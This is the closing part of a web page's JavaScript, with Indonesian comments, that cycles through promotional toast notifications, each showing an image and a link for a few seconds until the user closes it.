        document.getElementById('toast-img').src = dataPromo[currentIdx].img;
        
        // Update Link secara eksplisit
        toastLink.setAttribute('href', dataPromo[currentIdx].link);

        // Tampilkan
        toastWrapper.classList.add('muncul');

        // Durasi tampil
        setTimeout(() => {
            if(toastWrapper.classList.contains('muncul')) {
                toastWrapper.classList.remove('muncul');
                setTimeout(() => {
                    currentIdx++;
                    startPromo();
                }, 600);
            }
        }, 7000);
    }

    function tutupNotif() {
        toastWrapper.classList.remove('muncul');
        currentIdx = 999; // Stop antrian
    }

    // Jalankan segera
    startPromo();
</script>
</body>
</html>